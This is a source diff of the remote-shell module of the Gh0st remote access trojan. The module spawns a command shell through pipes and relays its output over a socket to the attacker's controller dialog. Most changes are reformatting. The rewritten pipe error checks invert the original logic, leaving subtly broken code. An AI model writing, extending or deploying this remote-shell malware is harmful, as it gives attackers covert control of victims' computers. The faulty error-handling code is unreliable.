@@ -6,39 +6,39 @@
 #include "ShellManager.h"
 #include "Others/macros.h"
 
-//////////////////////////////////////////////////////////////////////
-// Construction/Destruction
-//////////////////////////////////////////////////////////////////////
+
 namespace Gh0st {
 
 	CShellManager::CShellManager(CClientSocket *pClient) :CManager(pClient)
 	{
 		SECURITY_ATTRIBUTES  sa = { 0 };
 		STARTUPINFO          si = { 0 };
-		PROCESS_INFORMATION  pi = { 0 };
+		PROCESS_INFORMATION	 pi = { 0 };
 		char  strShellPath[MAX_PATH] = { 0 };
 
-		m_hReadPipeHandle = NULL;
-		m_hWritePipeHandle = NULL;
-		m_hReadPipeShell = NULL;
-		m_hWritePipeShell = NULL;
-		sa.nLength = sizeof(sa);
+		m_hReadPipeHandle		= NULL;
+		m_hWritePipeHandle		= NULL;
+		m_hReadPipeShell		= NULL;
+		m_hWritePipeShell		= NULL;
+		sa.nLength				= sizeof(sa);
 		sa.lpSecurityDescriptor = NULL;
-		sa.bInheritHandle = TRUE;
+		sa.bInheritHandle		= TRUE;
 
 
-		if (!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
-		{
-			if (m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
-			if (m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
-			return;
+		if (!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0)) {
+			if (!m_hReadPipeHandle && !m_hWritePipeShell) {
+				CloseHandle(m_hReadPipeHandle);
+				CloseHandle(m_hWritePipeShell);
+				return;
+			}
 		}
 
-		if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
-		{
-			if (m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
-			if (m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
-			return;
+		if (!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) {
+			if (!m_hReadPipeShell && !m_hWritePipeHandle) {
+				CloseHandle(m_hReadPipeShell);
+				CloseHandle(m_hWritePipeHandle);
+				return;
+			}
 		}
 
 		memset((void *)&si, 0, sizeof(si));
@@ -64,13 +64,26 @@ namespace Gh0st {
 			return;
 		}
 		m_hProcessHandle = pi.hProcess;
-		m_hThreadHandle = pi.hThread;
+		m_hThreadHandle  = pi.hThread;
 
+		// 发送开始命令TOKEN_SHELL_START
 		BYTE	bToken = TOKEN_SHELL_START;
 		Send((LPBYTE)&bToken, 1);
 		WaitForDialogOpen();
-		m_hThreadRead = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
-		m_hThreadMonitor = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
+
+		m_hThreadRead = DoCreateThread(NULL, 
+									   0, 
+									   (LPTHREAD_START_ROUTINE)ReadPipeThread,
+									   (LPVOID)this, 
+									   0, 
+									   NULL);
+
+		m_hThreadMonitor = DoCreateThread(NULL, 
+										  0, 
+										  (LPTHREAD_START_ROUTINE)MonitorThread, 
+										  (LPVOID)this, 
+									      0, 
+										  NULL);
 	}
 
 	CShellManager::~CShellManager()
@@ -122,15 +135,24 @@ namespace Gh0st {
 		while (1)
 		{
 			Sleep(100);
-			while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL))
+			while (PeekNamedPipe(pThis->m_hReadPipeHandle, 
+								 ReadBuff, 
+								 sizeof(ReadBuff), 
+								 &BytesRead, 
+								 &TotalBytesAvail, 
+							     NULL))
 			{
 				if (BytesRead <= 0)
 					break;
 				memset(ReadBuff, 0, sizeof(ReadBuff));
 				LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
-				ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
-				// 发送数据
-				pThis->Send(lpBuffer, BytesRead);
+
+				int rt = ReadFile(pThis->m_hReadPipeHandle, lpBuffer, 
+								  TotalBytesAvail, &BytesRead, NULL);
+				if (rt) {
+					// 把读取到的管道数据，通过socket发送到UI端的cmd对话框
+					pThis->Send(lpBuffer, BytesRead);
+				}
 				LocalFree(lpBuffer);
 			}
 		}
